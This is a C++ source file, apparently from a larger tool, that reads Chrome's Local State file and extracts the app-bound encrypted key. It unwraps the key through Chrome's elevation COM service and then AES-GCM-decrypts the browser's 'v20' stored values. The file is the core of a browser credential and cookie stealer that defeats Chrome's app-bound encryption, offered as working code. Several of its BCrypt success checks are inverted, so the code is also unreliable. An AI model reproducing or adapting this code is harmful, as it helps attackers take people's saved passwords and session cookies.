

#include "main.h"
#include <bcrypt.h>
#include <objbase.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")

namespace {

const GUID CLSID_ChromeElevator = {
    0x708860E0, 0xF641, 0x4611,
    { 0x88, 0x95, 0xAA, 0x29, 0x91, 0xE7, 0xC5, 0xF2 }
};

struct IElevatorVtbl {
    void* slots[7];
};
struct IElevator {
    IElevatorVtbl* lpVtbl;
};

typedef HRESULT (STDMETHODCALLTYPE *IElevatorDecryptDataFn)(void* This, BSTR dataIn, BSTR* dataOut);

std::vector<uint8_t> b64decode(const std::string& in) {
    static const char* t =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<uint8_t> o;
    int v = 0, b = -8;
    for (char c : in) {
        if (c == '=' || c == '\n' || c == '\r' || c == ' ') continue;
        const char* p = strchr(t, c);
        if (!p) continue;
        v = (v << 6) | (int)(p - t);
        b += 6;
        if (b >= 0) { o.push_back((uint8_t)((v >> b) & 0xFF)); b -= 8; }
    }
    return o;
}

bool DecryptAppBoundKey(const std::vector<uint8_t>& blob,
                        std::vector<uint8_t>& key) {
    if (blob.empty()) return false;

    BSTR inBstr = ::SysAllocStringByteLen(reinterpret_cast<LPCSTR>(blob.data()),
                                          (UINT)blob.size());
    if (!inBstr) return false;

    BSTR outBstr = nullptr;

    IElevator* elev = nullptr;
    HRESULT hr = ::CoCreateInstance(
        CLSID_ChromeElevator, nullptr,
        CLSCTX_LOCAL_SERVER,
        IID_IUnknown,
        reinterpret_cast<void**>(&elev));

    if (FAILED(hr) || !elev) {
        ::SysFreeString(inBstr);
        return false;
    }

    IElevatorDecryptDataFn decrypt =
        reinterpret_cast<IElevatorDecryptDataFn>(elev->lpVtbl->slots[6]);

    hr = decrypt(elev, inBstr, &outBstr);

    ::SysFreeString(inBstr);
    ((IUnknown*)elev)->Release();

    if (FAILED(hr) || !outBstr) {
        if (outBstr) ::SysFreeString(outBstr);
        return false;
    }

    UINT len = ::SysStringByteLen(outBstr);
    const uint8_t* p = reinterpret_cast<const uint8_t*>(outBstr);
    key.assign(p, p + len);
    ::SysFreeString(outBstr);

    return !key.empty();
}

bool AesGcmDecrypt(const uint8_t* key, size_t keyLen,
                   const uint8_t* nonce, size_t nonceLen,
                   const uint8_t* cipher, size_t cipherLen,
                   const uint8_t* tag, size_t tagLen,
                   std::vector<uint8_t>& plaintext) {
    plaintext.clear();
    BCRYPT_ALG_HANDLE  alg = nullptr;
    BCRYPT_KEY_HANDLE  hKey = nullptr;
    bool ok = false;

    if (!BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0))
        goto done;
    if (!BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                           sizeof(BCRYPT_CHAIN_MODE_GCM), 0))
        goto done;
    if (!BCryptGenerateSymmetricKey(alg, &hKey, nullptr, 0,
                                    (PUCHAR)key, (ULONG)keyLen, 0))
        goto done;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = (PUCHAR)nonce;
    ai.cbNonce = (ULONG)nonceLen;
    ai.pbTag   = (PUCHAR)tag;
    ai.cbTag   = (ULONG)tagLen;

    plaintext.resize(cipherLen);
    ULONG outLen = 0;
    if (BCryptDecrypt(hKey,
                      (PUCHAR)cipher, (ULONG)cipherLen,
                      &ai, nullptr, 0,
                      plaintext.data(), (ULONG)plaintext.size(),
                      &outLen, 0) == 0) {
        plaintext.resize(outLen);
        ok = true;
    } else {
        plaintext.clear();
    }

done:
    if (hKey) BCryptDestroyKey(hKey);
    if (alg)  BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

std::vector<uint8_t> g_appBoundKey;
bool                g_keyTried   = false;
bool                g_comInited  = false;

bool EnsureComInit() {
    if (g_comInited) return true;
    HRESULT hr = ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    g_comInited = SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE;
    return g_comInited;
}

bool DeriveAppBoundKey(const std::wstring& localStatePath) {

    HANDLE h = ::CreateFileW(localStatePath.c_str(), GENERIC_READ,
                             FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    DWORD sz = ::GetFileSize(h, nullptr);
    if (sz == 0 || sz > 10 * 1024 * 1024) { ::CloseHandle(h); return false; }

    std::string json(sz, '\0');
    DWORD rd = 0;
    ::ReadFile(h, &json[0], sz, &rd, nullptr);
    ::CloseHandle(h);

    const char* key = "\"app_bound_encrypted_key\":\"";
    size_t pos = json.find(key);
    if (pos == std::string::npos) return false;
    pos += strlen(key);
    size_t end = json.find('"', pos);
    if (end == std::string::npos) return false;

    std::vector<uint8_t> raw = b64decode(json.substr(pos, end - pos));
    if (raw.size() < 8) return false;
    if (memcmp(raw.data(), "APPB", 4) != 0) return false;

    return DecryptAppBoundKey(raw, g_appBoundKey) && g_appBoundKey.size() == 32;
}

}

bool ChromeV20Decrypt(const std::wstring& localStatePath,
                      const std::vector<uint8_t>& encValue,
                      std::vector<uint8_t>& plaintext) {
    plaintext.clear();

    if (encValue.size() < 3 + 12 + 16) return false;
    if (encValue[0] != 'v' || encValue[1] != '2' || encValue[2] != '0')
        return false;

    if (!EnsureComInit()) return false;

    if (!g_keyTried) {
        g_keyTried = true;
        if (!DeriveAppBoundKey(localStatePath)) {
            g_appBoundKey.clear();
        }
    }
    if (g_appBoundKey.size() != 32) return false;

    const uint8_t* nonce    = encValue.data() + 3;
    const uint8_t* cipher   = encValue.data() + 3 + 12;
    size_t         cipherLen= encValue.size() - 3 - 12 - 16;
    const uint8_t* tag      = encValue.data() + encValue.size() - 16;

    return AesGcmDecrypt(g_appBoundKey.data(), 32,
                         nonce, 12,
                         cipher, cipherLen,
                         tag,   16,
                         plaintext);
}

void ChromeV20Cleanup() {
    if (g_comInited) {
        ::CoUninitialize();
        g_comInited = false;
    }

    util::SecureZero(g_appBoundKey.data(), g_appBoundKey.size());
    g_appBoundKey.clear();
    g_keyTried = false;
}
